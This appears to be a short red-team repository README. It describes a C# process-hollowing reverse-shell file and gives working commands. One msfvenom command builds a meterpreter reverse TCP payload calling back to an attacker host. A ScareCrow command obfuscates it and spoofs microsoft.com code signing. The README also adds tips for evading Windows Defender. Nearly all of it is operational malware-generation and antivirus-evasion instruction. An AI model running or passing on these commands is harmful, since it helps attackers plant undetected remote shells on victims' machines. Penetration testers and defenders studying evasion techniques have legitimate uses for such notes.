# redteam

## source-codes
***reverse-shell-hollowing.cs*** - This C# code executes a reverse shell using the Process Hollowing technique, where a victim process is created in a suspended state, its original process (e.g.: notepad.exe) is carved out from memory, a malicious binary gets written instead and the program state is resumed to execute the injected code.</br> 
You can compile it with `mcs hollowing.cs`

## Useful Commands

***ScareCrow*** - This framework generates a "obfuscated" binary using some bypass techniques like DLL unhooking, ETW patching and Code signing(The same as ***limelighter*** does).</br> Example of usage:</br> You can generate a malicious binary and test in your windows vm if it is detected by windows defender:</br> `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=443 -f raw -o malware.bin`</br> Then, use ScareCrow to generate obfuscated versions:</br> `./ScareCrow -I malware.bin -domain www.microsoft.com -encryptionmode AES` (You can change the encryption mode to ELZMA)</br>
>  When signing the loader with microsoft.com, using them against WINDOWS DEFENDER ATP products may not be as effective as they can validate the cert as it belongs to them. If you are using a loader against a windows product, possibly use a different domain.</br>
